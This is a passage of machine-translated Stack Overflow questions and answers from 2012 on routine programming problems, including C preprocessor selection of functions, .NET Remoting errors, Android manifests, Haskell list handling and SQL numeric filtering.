然而，这样做的问题是 getstate 和 kalmanstate 都将被编译，这违背了我的模拟目的。对我来说，这听起来不是我想要的包装器的最佳实现。我知道 C 中存在条件执行，但我将如何使用它来编译正确的函数？我的意思是如果我在头文件中做这样的事情：

```
#ifdef __C__FUNC
void getstate(state* m, int *values);
#endif
#ifdef __kalman
void kalmanstate(state *m, int *values)
#endif 
```

然后在调用者中： include "headerfile.h" //包含上面的头文件 //调用者定义_C _FUNC 定义__C_FUNC callTheRightFunction(m,p,&getstate) *;* 但是由于我在开头包含头文件时没有定义它们，所以它可能根本不会包含它们中的任何一个，因此会产生运行时错误。任何对正确方向的建议将不胜感激。提前谢谢各位！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:18:53.637

我认为这里没有问题。

选项：

1.  命名以不同方式执行相同操作的 ASM 和 C 函数。使用`if`or `switch`or，上帝保佑，`?:`调用正确的。
2.  同名设置如上。使用函数指针。如果你给它分配了 ASM 函数的地址，那么通过这个指针的函数调用就会去那里。如果将 C 函数的地址分配给它，调用将同样转到 C 函数。
3.  同名设置如上。定义一个可以扩展为 ASM 或 C 函数名称的宏。您可以使用编译器的选项在编译时定义宏。在需要调用这两个函数之一的代码中使用该宏。
4.  将 ASM 和 C 函数放入单独的 .asm/.s 和 .c 文件中。编译时，要么在已编译文件列表中包含一个文件，要么包含另一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T06:37:24.423

根据您对原始问题的补充，您想知道是否不会编译任何函数。然后你必须定义`__C__FUNC`或`__kalman`在你包含头文件之前：

```
#define __C__FUNC
#include "header.h" 
```

但是当你没有定义任何东西时，为了避免这个问题，一种方法是让你在 SOURCE 文件上只使用一个定义，就像这样：

```
#ifdef __GSTATE_USE_C_FUNCTION
void getstate(state* m, int *values)
{
    // C version
}
#else
void getstate(state *m, int *values)
{
    // Assembly version
}
#endif 
```

在头文件上：

```
void getstate(state *m, int *values); 
```

（注意函数名相同，调用函数时无需修改代码）

但这只有在您也在`getstate`正在实施的源文件中包含标头时才有效。**(*1)**

然后，如果您忘记`__GSTATE_USE_C_FUNCTION`在包含标题之前进行定义，则将使用第二个函数，因为它触发了`#else`.

现在，您将在两个源文件都包含的头文件（即实现该函数的文件和使用它的文件）上像这样使用它：

```
// Comment the line below if you want the other version
#define __GSTATE_USE_C_FUNCTION 
```

当然，在包含包含原型声明的标头之前，您必须包含此标头。

在源文件上：

```
// Somewhere else on the code where you use the function
getstate(m, values); 
```

因此，您只需更改`#define`全局标题上的行。

此外，如果您的编译器有一个选项可以在命令行中为它进行预处理器定义，那么您甚至不需要在`__GSTATE_USE_C_FUNCTION`之前定义`#include`，您只需将其用作命令行选项，就像这样（例如在密送32):

```
bcc32 /D"__GSTATE_USE_C_FUNCTION" hello.c 
```

这将避免问题**(*1)**，并且您不必制作两个源文件都必须包含的全局头文件。

# .net - .NET Remoting 二进制格式化程序反序列化抛出“索引超出数组范围”

> ID：12659110
> 
> 赞同：-1
> 
> 时间：2012-09-30T06:10:56.190
> 
> 标签：.net, vb.net, serialization, remoting

这是代码：

```
Dim serverProv As New System.Runtime.Remoting.Channels.BinaryServerFormatterSinkProvider
serverProv.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full
Dim clientProv As New System.Runtime.Remoting.Channels.BinaryClientFormatterSinkProvider
Dim props As New System.Collections.Hashtable
props("port") = 0 ' Implies client should use an available port!
Dim m_channel As New TcpChannel(props,clientProv, serverProv)
ChannelServices.RegisterChannel(channel) 
iRemoteClientServer = CType(Activator.GetObject(GetType(ABC.XYZ.Interfaces.IClientServer),sAddress,ABC.XYZ.Interfaces.IClientServer)
iRemoteClientServer.Process(oContext) -- Object containing the data which is processed by a function Process in a windows service -- Thsi is the line that throws the exception shown above 
```

当我们将自定义对象从 VB.NET DLL 传递到 Windows 服务时，会引发此错误。这是在安装了 .NET framework 1.1、2.0 和 4.0 的机器上。非常感谢这里的任何帮助。

```
System.IndexOutOfRangeException: Index was outside the bounds of the array.

Server stack trace: 
   at System.Runtime.Serialization.Formatters.Binary.ReadObjectInfo.GetMemberTypes(String[] inMemberNames)
   at System.Runtime.Serialization.Formatters.Binary.ObjectMap..ctor(String objectName, String[] memberNames, BinaryTypeEnum[] binaryTypeEnumA, Object[] typeInformationA, Int32[] memberAssemIds, ObjectReader objectReader, Int32 objectId, BinaryAssemblyInfo assemblyInfo, SizedArray assemIdToAssemblyTable)
   at System.Runtime.Serialization.Formatters.Binary.ObjectMap.Create(String name, String[] memberNames, BinaryTypeEnum[] binaryTypeEnumA, Object[] typeInformationA, Int32[] memberAssemIds, ObjectReader objectReader, Int32 objectId, BinaryAssemblyInfo assemblyInfo, SizedArray assemIdToAssemblyTable)
   at System.Runtime.Serialization.Formatters.Binary.__BinaryParser.ReadObjectWithMapTyped(BinaryObjectWithMapTyped record)
   at System.Runtime.Serialization.Formatters.Binary.__BinaryParser.ReadObjectWithMapTyped(BinaryHeaderEnum binaryHeaderEnum)
   at System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run()
   at System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize(HeaderHandler handler, __BinaryParser serParser, Boolean fCheck, IMethodCallMessage methodCallMessage)
   at System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Deserialize(Stream serializationStream, HeaderHandler handler, Boolean fCheck, IMethodCallMessage methodCallMessage)
   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage& responseMsg, ITransportHeaders& responseHeaders, Stream& responseStream)

Exception rethrown at [0]: 
   at System.Runtime.Remoting.Proxies.RealProxy.HandleReturnMessage(IMessage reqMsg, IMessage retMsg)
   at System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData& msgData, Int32 type) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-09T05:44:48.367

只是想发布从 Microsoft 安装此 HotFix 解决此问题的解决方案：http: [//archive.msdn.microsoft.com/KB907262/Release/ProjectReleases.aspx? ReleaseId=772](http://archive.msdn.microsoft.com/KB907262/Release/ProjectReleases.aspx?ReleaseId=772)

# android - 读取联系人给出强制关闭错误

> ID：12659112
> 
> 赞同：0
> 
> 时间：2012-09-30T06:11:34.407
> 
> 标签：android, android-contacts

我已经尝试过以下**在 Android 中读取联系人的教程**

```
http://www.edumobile.org/android/android-programming-tutorials/read-contacts-from-device/

http://eagle.phys.utk.edu/guidry/android/readContacts.html 
```

两者都完成，没有任何错误，但是当我运行时，它显示强制关闭错误

我尝试使用 API 8、13、16

所有人都犯同样的错误。我不知道更多，但我完全按照教程。

**目录在这里**

```
09-30 14:02:09.121: D/AndroidRuntime(305): Shutting down VM
09-30 14:02:09.121: W/dalvikvm(305): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
09-30 14:02:09.141: E/AndroidRuntime(305): FATAL EXCEPTION: main
09-30 14:02:09.141: E/AndroidRuntime(305): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.app.ReadContacts/com.app.ReadContacts.ReadContacts}: java.lang.ClassNotFoundException: com.app.ReadContacts.ReadContacts in loader dalvik.system.PathClassLoader[/data/app/com.app.ReadContacts-2.apk]
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2585)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.ActivityThread.access$2300(ActivityThread.java:125)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.os.Handler.dispatchMessage(Handler.java:99)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.os.Looper.loop(Looper.java:123)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.ActivityThread.main(ActivityThread.java:4627)
09-30 14:02:09.141: E/AndroidRuntime(305):  at java.lang.reflect.Method.invokeNative(Native Method)
09-30 14:02:09.141: E/AndroidRuntime(305):  at java.lang.reflect.Method.invoke(Method.java:521)
09-30 14:02:09.141: E/AndroidRuntime(305):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
09-30 14:02:09.141: E/AndroidRuntime(305):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
09-30 14:02:09.141: E/AndroidRuntime(305):  at dalvik.system.NativeStart.main(Native Method)
09-30 14:02:09.141: E/AndroidRuntime(305): Caused by: java.lang.ClassNotFoundException: com.app.ReadContacts.ReadContacts in loader dalvik.system.PathClassLoader[/data/app/com.app.ReadContacts-2.apk]
09-30 14:02:09.141: E/AndroidRuntime(305):  at dalvik.system.PathClassLoader.findClass(PathClassLoader.java:243)
09-30 14:02:09.141: E/AndroidRuntime(305):  at java.lang.ClassLoader.loadClass(ClassLoader.java:573)
09-30 14:02:09.141: E/AndroidRuntime(305):  at java.lang.ClassLoader.loadClass(ClassLoader.java:532)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.Instrumentation.newActivity(Instrumentation.java:1021)
09-30 14:02:09.141: E/AndroidRuntime(305):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2577)
09-30 14:02:09.141: E/AndroidRuntime(305):  ... 11 more
09-30 14:07:09.262: I/Process(305): Sending signal. PID: 305 SIG: 9 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:42:52.950

您是否已将 com.app.ReadContacts.ReadContacts Activity 添加到您的 AndroidManifest.xml 中？

您收到的错误表明您没有...

要添加的行可能是

```
<activity android:name=".ReadContacts"/> 
```

尽管根据您的项目结构，可能需要使用完全限定名称

```
<activity android:name="com.app.ReadContacts.ReadContacts"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T08:43:42.257

似乎`com.app.ReadContacts.ReadContacts`找不到该类。您是否在`AndroidManifest.xml`文件中指定了活动？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T06:23:02.870

您是否在清单文件中提到了读取联系人权限？

`<uses-permission android:name="android.permission.READ_CONTACTS" />`

如果是，则从 log cat 发布错误消息

# windows-8 - Window 8 Frame 导航事件

> ID：12659116
> 
> 赞同：0
> 
> 时间：2012-09-30T06:11:53.800
> 
> 标签：windows-8

我需要挂钩框架导航事件。我应该如何以及何时加入框架导航事件？我尝试在页面的构造函数中，但似乎尚未创建框架。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T15:33:03.580

如果您将 Frame 放置在页面中，请尝试在 Page.OnNavgatedTo 事件中将其挂钩并在 Page.OnNavigatedFrom 中取消挂钩。

# java - 如何列出 Java 方法/函数中的所有局部变量？

> ID：12659117
> 
> 赞同：7
> 
> 时间：2012-09-30T06:12:19.793
> 
> 标签：java, reflection, compiler-construction, profiling, antlr

我的主要问题：我知道你可以通过反射一般地输出类字段，即使你不知道变量名、类型，甚至不知道有多少。但是，有没有办法列出当前函数或当前范围内的所有变量，假设我不知道变量名是什么？

换句话说：

```
int x = 5;
int y = 42;
// some more code
//Now I want to println x and y, but assuming I cannot use "x" or "y". 
```

我也很乐意回答这个问题：假设我可以存储所有变量的名称，这有帮助吗？例如：

```
Set<String> varNames = new HashSet<String>();
int x = 5;
varNames.add("x");
int y = 42;
varNames.add("y");
// some more code
//Now with varNames, can I output x and y without using "x" or "y"? 
```

我为什么要问这个？我正在使用 ANTLR 将 XYZ 语言翻译成 java，我想提供一个简单的方法来输出程序在任何时间点的整个状态。

第三种可能的解决方案我会很高兴：如果这在 Java 中是不可能的，有什么方法可以为访问调用函数并检查堆栈的函数编写字节码？这也将解决问题。

如果 Java 有 Python`eval()`或 php 的`get_defined_vars()`.

如果它有所作为，我使用的是 Java 6，但 Java 5、6 或 7 的任何东西都应该是好的。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T06:40:36.547

据我所知，你不能。至少，不是普通的 Java 代码。如果您能够在运行之前通过某种后处理器运行字节码，并假设您仍在使用包含的调试符号进行构建，那么您可以自动生成代码来执行此操作 - 但我不相信有通过反射访问当前堆栈帧中的局部变量的任何方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T11:09:59.613

如果您不想将其用作程序正常执行路径的一部分而只是用于调试，那么请使用[Java 平台调试器体系结构 (JPDA)](http://docs.oracle.com/javase/6/docs/technotes/guides/jpda/index.html)。本质上，您将编写自己的调试器、设置断点并使用[JDI API](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdi/index.html)来查询程序的状态。局部变量可以用[StackFrame#visibleVariables()](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdi/com/sun/jdi/StackFrame.html#visibleVariables%28%29)列出。

如果上述不是一个选项，将很难实现。要获取变量名称，您可以解析类文件并读取方法的局部变量表属性。但是，获取局部变量值的唯一方法是通过 aload/iload/etc。字节码指令。这些必须存在于您要分析的方法中，因此您不能将此功能放入不同的辅助方法中。

# google-app-engine - GAE 过滤器实体键 (Golang)

> ID：12659126
> 
> 赞同：3
> 
> 时间：2012-09-30T06:14:43.187
> 
> 标签：google-app-engine, google-cloud-datastore, go

我想用看起来像

```
datastore.NewQuery("Article").Filter("ID =", id) 
```

获取实体密钥。

这是怎么做的？

对不起我的英语不好。谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-05T19:48:30.687

这些解决方案怎么样，这些方式你不需要查询，迭代器也不是解决问题的更直接方式。

```
var article Article
k := datastore.NewKey(c, "Article", "", usrr.User, nil)
q := datastore.Get(c,k,&article) 
```

你觉得呢？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T20:18:38.327

我从未尝试过 Go，但我会试一试：

```
k := datastore.NewKey(c, "Activity", "", id, nil)
q := datastore.NewQuery("Article").Filter("__key__ =", k) 
```

`c`你在哪里`appengine.Context`

# asp.net - 如何将子 gridview 插入父 gridview 的每一行

> ID：12659129
> 
> 赞同：-1
> 
> 时间：2012-09-30T06:15:09.217
> 
> 标签：asp.net, gridview, datagridview

如何将子网格视图插入父网格视图。我想要一个 asp.net 代码将任何行动态插入到这种类型的网格中，我希望 asp.net 代码将用户已经写入的数据管理到该类型网格的列中，同时将新行添加到此类用户输入的下一个条目的网格类型。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:20:41.150

可以：

*   为“主”GridView 指定一个特定的列 ItemTemplate；

*   在其中定义“子”GridView 控件；

*   处理“主”网格 RowDataBound 事件并自定义必要的“子”网格属性；

*   处理“子”RowInserting 事件事件并执行必要的服务器端操作。

# markerclusterer - 传单标记不会在点击时打开弹出窗口

> ID：12659137
> 
> 赞同：3
> 
> 时间：2012-09-30T06:17:14.603
> 
> 标签：markerclusterer, openstreetmap, leaflet, mapbox

我刚开始使用 Leaflet 和[Marker Clusterer](https://github.com/danzel/Leaflet.markercluster)来组织标记。

**问题 #1：**单击非聚集标记时，不会出现弹出窗口。

**问题#2：**当一个集群被多次点击时，该集群内的所有标记都会出现，当点击其中一个标记时，它的弹出窗口就会出现！但是，通过单击地图关闭弹出窗口后，单击任何这些聚集标记都不会打开任何弹出窗口！

如果我只有 3 个未聚集的标记，则弹出窗口可以正常工作。但是，随着更多标记的添加，一旦形成集群，单击任何集群中的标记都不会导致弹出窗口打开！

**初始化markerclusterer**

```
markers = new L.MarkerClusterGroup();
map.addLayer(markers); 
```

**添加到markercluster的所有标记`markers`**

一个循环调用该`render`函数来创建`marker`并将其添加到 markerclusterer 的数组`markers`中。*（忽略backbone.js代码）*

```
ListingMarkerView = Backbone.View.extend({
    template: _.template( $('#tpl_ListingMarkerView').html() ),

    render: function() {

        // Create marker
        var content = this.template( this.model.toJSON() );
        var marker = new L.marker(
            [this.model.get('lat'), this.model.get('lng')],
            {content: content});
        marker.bindPopup(content);

        // Add to markerclusterer
        markers.addLayer(marker);
    }
}); 
```

**没有markerclusterer**

如果我`marker`直接添加到`map`而不是 markerclusterer array `markers`，弹出窗口工作正常，所以我猜这个问题与 markerclusterer 有关。

我是否做错了什么导致弹出窗口的这种行为？感谢所有帮助，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T17:06:09.583

根据我对集群标记组的了解，您应该这样做：

```
var markerGroup = new L.MarkerClusterGroup();
markerGroup.on('click', function(ev) {
    // Current marker is ev.layer
    // Do stuff
}); 
```

要将事件处理程序添加到集群层，请执行以下操作：

```
markerGroup.on('clusterclick', function(ev) {
    // Current cluster is ev.layer
    // Child markers for this cluster are a.layer.getAllChildMarkers()
    // Do stuff
}); 
```

哦，仔细阅读 github [README](https://github.com/danzel/Leaflet.markercluster)，都在里面……

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-24T15:37:09.100

确保 Leaflet + Clusterer 堆栈（Js 和 Css）中所有内容的正确版本。与 Clusterer Github 存储库中的示例进行比较。

# haskell - 如何返回从列表前面删除指定数量元素的列表

> ID：12659139
> 
> 赞同：2
> 
> 时间：2012-09-30T06:17:18.447
> 
> 标签：haskell, recursion, functional-programming

我在 Haskell 中编写了一个函数，它递归地返回列表，并从列表的前面删除了指定数量的元素。我已经让它工作了：

```
removefront :: Int -> [Int] -> [Int]
removefront n xs =
    if n <= 0 then xs
    else removefront (n-1) (tail xs) 
```

这可以工作并且完全符合我的要求，但是有没有办法在没有尾部功能的情况下做同样的事情。谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T06:26:16.163

这个功能是“内置”的，因为它在前奏中并被称为 drop

```
*Main> :t drop
drop :: Int -> [a] -> [a]
*Main> drop 3 [1,2,3,4,5,6,7]
[4,5,6,7] 
```

现在，我假设这不是您要寻找的答案。您可以轻松修改函数以不使用 tail。诀窍是使用模式匹配。

```
removefront :: Int -> [Int] -> [Int]
removefront n (x:xs) = if n <= 0 then (x:xs) else removefront (n-1) xs 
```

三个音符

1.  大多数 Haskeller 不会使用`if then else`这样的功能，更喜欢看守

    ```
    removefront n (x:xs) 
       | n <= 0    = (x:xs)
       | otherwise = removefront (n-1) xs 
    ```

2.  的类型`removefront`可以更通用

    ```
    removefront :: Int -> [a] -> [a] 
    ```

    实际上它可能一直到

    ```
    removefront :: (Num i, Ord i) => i -> [a] -> [a] 
    ```

    但这越来越过分了

3.  您应该考虑将空列表交给函数时会发生什么——您希望它做什么？

# php - 在 Dreamweaver 中为控制结构使用 php 替代语法时，如何找到结束标记？

> ID：12659141
> 
> 赞同：1
> 
> 时间：2012-09-30T06:18:07.183
> 
> 标签：php, dreamweaver

**在工作 ：**

```
<?php if ($a == 5){ ?>
A is equal to 5
<?php } ?> 
```

[在 Dreamweaver 中使用 Ctrl+'/Cmd+' 可以选择匹配的开闭花括号、方括号或圆括号。这对长度代码很有帮助，但在Alternative php 语法](http://php.net/manual/en/control-structures.alternative-syntax.php)中不起作用。

**不工作：**

```
<?php if ($a == 5): ?>
A is equal to 5
<?php endif; ?> 
```

我想要这个选项来[替代控制结构的语法](http://php.net/manual/en/control-structures.alternative-syntax.php)。

在 Dreamweaver 上可以吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:26:05.447

不，我假设第一个选项是菜单快捷方式，上面写着“平衡括号”或类似的东西。我没想到会这样。

# sql - 如何仅选择数值

> ID：12659142
> 
> 赞同：15
> 
> 时间：2012-09-30T06:18:12.120
> 
> 标签：sql, sql-server, tsql, sql-server-2000

表格1

ID

```
01
wire
02
steve
ram123
03
.... 
```

从 table1 我只想选择数值，它不应该显示像 (ram123) 这样的字母数字值

预期产出

```
01
02
03
.... 
```

如何查询此条件

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-30T06:19:43.497

尝试**[`ISNUMERIC`](http://msdn.microsoft.com/en-us/library/ms186272.aspx)**

```
SELECT *
FROM Table1
WHERE ISNUMERIC([ID]) = 1 
```

[SQLFiddle 演示](http://sqlfiddle.com/#!18/416bf/1)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-30T21:04:16.287

```
SELECT * FROM @Table 
WHERE Col NOT LIKE '%[^0-9]%' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T07:01:12.037

只想注意 IsNumeric() 有一些限制。例如，以下所有内容都将返回 1。

```
SELECT ISNUMERIC(' - ')
SELECT ISNUMERIC(' , ')
SELECT ISNUMERIC('$')
SELECT ISNUMERIC('10.5e-1')
SELECT ISNUMERIC('$12.09') 
```

因此，如果您只想选择数字，那么这样的事情可能会起作用：

```
create function [dbo].[IsNumbersOnly](@strSrc as varchar(255))
returns tinyint
as
begin

    return isnumeric(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(
        @strSrc, '\', 'x'), '-', 'x'), ',', 'x'), '+', 'x'), '$', 'x'), '.', 'x'), 'e', 'x'), 'E', 'x'),
        char(9), 'x'), char(0), 'x'))
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T06:23:19.843

```
 SELECT column1 FROM table where ISNUMERIC(column1) = 1 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-16T13:47:51.683

您可以一起使用翻译和替换功能。首先将数字转换为 0，然后将它们替换为 null 并仅返回 null 值可以解决问题。

```
select column from table where  replace(translate(column,'0123456789','0000000000'),'0','') is null 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-06-02T06:00:00.340

我尝试了上面的代码 ( `ISNUMERIC()`)，但它在 Oracle SQL 中不起作用。
但我找到了适用于 Oracle SQL 的有效解决方案：

```
SELECT column1
FROM Table
WHERE regexp_like( column1, '^[[:digit:]]*$'); 
```

来自：[https ://community.oracle.com/thread/2394572](https://community.oracle.com/thread/2394572)

# xaml - 如何在 Windows 8 的 WebView 中隐藏滚动条？

> ID：12659143
> 
> 赞同：0
> 
> 时间：2012-09-30T06:18:17.867
> 
> 标签：xaml, windows-8, scrollbar

我正在尝试在我的 Metro 应用程序中隐藏滚动条，就像我通常在 Windows Phone 应用程序中所做的那样：

```
<WebView x:Name="webView" 
    Height="395" Width="300"
    ScrollViewer.VerticalScrollBarVisibility="Hidden"
    ScrollViewer.HorizontalScrollBarVisibility="Hidden"/> 
```

但即使我用嵌入式包围它也不起作用

```
<ScrollViewer Name="ScrollViewerForWebView"
    Grid.Row="1"
    Grid.Column="1"
    HorizontalAlignment="Left"
    VerticalAlignment="Top" 
    VerticalScrollBarVisibility="Hidden"
    HorizontalScrollBarVisibility="Hidden">

    <WebView x:Name="webView" Height="395" Width="300" />
</ScrollViewer> 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T17:41:56.333

如果你设置

```
ScrollViewer.VerticalScrollBarVisibility="Disabled" 
```

# c - 为什么 C89 库不包含创建/删除/重命名/删除目录的函数？

> ID：12659144
> 
> 赞同：2
> 
> 时间：2012-09-30T06:18:19.517
> 
> 标签：c

我为我糟糕的英语道歉。

为什么 C89 库不包含创建/删除/重命名/删除目录的函数？或者也许我没有发现？我只看到某些文件操作的函数，但看不到目录的函数。

谢谢您最好的问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:46:34.877

传统上（并且 C89 是传统）目录结构被视为操作系统的一部分，并且在当时（1989 年）仍然有 OS arround 具有不兼容的概念。

如今，可能有足够的共同点将这样的东西集成到 C 中，就像现在在 C11 中为线程所做的那样，但我不知道这样做的倡议。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T07:28:04.370

否则，`<dirent.h>`头文件现在是伪标准的：MinGW 和 GCC 都有它。因此，您可以在传统的个人计算机上处​​理目录，而不会有太多麻烦。

# javascript - 溢出隐藏在使用粒子的 ios 设备中不起作用

> ID：12659145
> 
> 赞同：1
> 
> 时间：2012-09-30T06:18:28.537
> 
> 标签：javascript, ios, css, overflow, particles

我有一个非常简单的登录页面，背景中有一些动画粒子，它们是小图像。在典型的浏览器中似乎可以正常工作，但是在任何移动 ios 平台（iphone/ipad 等）上，粒子似乎会导致视图在浮动到页面边界时不断调整大小......我认为溢出隐藏会阻止这种情况。 ..我对此一无所知...

这是网站：[www.test.joshmu.com](http://www.test.joshmu.com)

显然，您必须在 ios 设备上查看此内容才能看到我正在谈论的屏幕“抖动”。任何帮助将不胜感激！

-更新：我用于正文的一些 JS 代码在普通浏览器上运行良好

```
//set up the page
var W = window.innerWidth;
var H = window.innerHeight;
var bodyStyle = document.body.style;
bodyStyle.backgroundColor = 'rgba(2,34,63,1)';
bodyStyle.width = W;
bodyStyle.height = H;
bodyStyle.position = 'relative';
bodyStyle.top = '0px';
bodyStyle.left = '0px';
bodyStyle.margin = '0px';
bodyStyle.padding = '0px';
bodyStyle.overflow = "hidden"; 
```

我还应该补充一点，当我控制台记录 window.onresize 事件时，事实证明它在从 ios 平台查看时会不断触发。

# java - Java - 使用 Point 类返回二维数组中的位置值

> ID：12659152
> 
> 赞同：1
> 
> 时间：2012-09-30T06:19:39.050
> 
> 标签：java, arrays, class, point, maze

我正在编写一个程序，其中我有一个来自单元格类的对象的二维数组，我需要编写一个方法，在该方法中我将一个单元格对象作为参数传递，并返回一个围绕单元格的单元格数组列表（N，S， E、W)。每个单元格都从 Point 类中获得一个位置。我遇到的问题是如何使用我知道的位置（x，y-1 是北）来生成一个单元格。对此的任何帮助表示赞赏。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:30:16.407

如果 (x,y) 是您的单元格，那么它周围的四个单元格是

```
(x+1, y)
(x-1, y)
(x, y+1)
(x, y-1) 
```

你可能会做出这样的假设

```
+x axis is EAST
-x axis is WEST
+y axis is NORTH
-y axis is SOUTH 
```

所以

```
(x+1, y) is EAST to the cell,
(x-1, y) is WEST to the cell,
(x, y+1) is NORTH to the cell and 
(x, y-1) is SOUTH 
```

到您作为参数传递给您的方法的单元格。

# matlab - 双击以在独立的 matlab 应用程序上打开文件

> ID：12659154
> 
> 赞同：1
> 
> 时间：2012-09-30T06:19:49.953
> 
> 标签：matlab, user-interface, double-click

我有带有自己扩展名（.Z4R）的时间序列文件。我已经编译了我的 matlab GUI 来读取它们。

现在我从 GUI 加载这些文件（查找路径...）。我想知道是否可以双击 .Z4R 以将其加载到我的程序中。

* * *

谢谢你。

我理解窗口部分。我不知道这个命令行在 GUI .exe 启动时接受输入（Z4D）。我怎么知道双击文件的路径。

谢谢马克

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-01T09:37:28.467

您应该能够通过 Windows 文件关联来执行此操作（假设您正在运行 Windows）。

您需要检查应用程序的命令行参数并酌情打开提供的 Z4R 文件。

看看谷歌看看如何设置[文件关联](http://www.google.com/search?q=windows%20extension%20association)

如果你编译的 Matlab GUI 是使用 Matlab 工具指南创建的，你应该有一个函数

```
 function YourProgramName_OpeningFcn(hObject, eventdata, handles, varargin) 
```

varargin 应该包含您双击的文件名。

# python - 在 python 中使用 Glade 3.12 小部件

> ID：12659161
> 
> 赞同：1
> 
> 时间：2012-09-30T06:21:18.627
> 
> 标签：python, pygtk, glade

就像一些历史一样，我已经使用 python 大约 5 年了，最终决定在 Glade 制作我的第一个 gui 应用程序。

我从一些基本的东西开始，我有一个按钮、一个 Gtkentry 和 gtktextview 这就是我想要完成的：

按下按钮时，从 gtk.entry 中获取文本并将其附加到 gtk.textview

现在我遇到的主要问题是我找不到有关如何使用小部件的下降文档，并且我在 Internet 上找到的示例参考了一个构建器变体以及另一个我只能假设已停止的 glade 项目变体. 我想了解 builder 如何融入 python / glade 协作。

到目前为止我的代码：

```
import gtk
import pygtk

def onDeleteWindow(self, *args):
    Gtk.main_quit(*args)

def hello(button):
    text_buffer.set_text(txtinput.get_text())

builder = gtk.Builder()
builder.add_from_file("dagui.glade")

handlers = {
    "onDeleteWindow": gtk.main_quit,
    "buttondown": hello
}
builder.connect_signals(handlers)

textarea = builder.get_object("textview1")
window = builder.get_object("window1")
txtinput = builder.get_object("entry1")
window.show_all()

gtk.main()
window.show_all()

gtk.main() 
```

现在这一切正常，按下按钮将打印 gtk.entry 中的内容，但我找不到如何将其附加到 textview 中。我也不确定要搜索什么来查找文档，我尝试了“gtk builder gtk.textview”和 pygtk build gtk.textview append”以及所有其他变体。

虽然知道如何简单地将文本添加到文本视图会很棒，但如果有一个链接到某个地方，我可以用简单的英语获得如何使用这些小部件，我将永远充满乐趣。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:45:34.720

Frob [`gtk.TextView`](http://www.pygtk.org/docs/pygtk/class-gtktextview.html)，您需要[`gtk.TextBuffer`](http://www.pygtk.org/docs/pygtk/class-gtktextbuffer.html)使用 textview 的`buffer`属性来获取 。

从文本缓冲区中，您需要使用该方法获取指向缓​​冲区末尾的迭代器[`get_end_iter`](http://www.pygtk.org/docs/pygtk/class-gtktextbuffer.html#method-gtktextbuffer--get-end-iter)。使用该迭代器和您的文本，您可以使用文本缓冲区的[`insert`](http://www.pygtk.org/docs/pygtk/class-gtktextbuffer.html#method-gtktextbuffer--insert)方法。

**编辑：**由于我没有该`dagui.glade`文件，因此无法对其进行测试，但请参阅以下代码：

```
def hello(button):
    global textarea, txtinput
    buffer = textarea.get_property('buffer')
    i = buffer.get_end_iter()
    buffer.insert(i, txtinput.get_text())
    # clear the input window after appending the text
    txtinput.set_text('') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T14:41:47.693

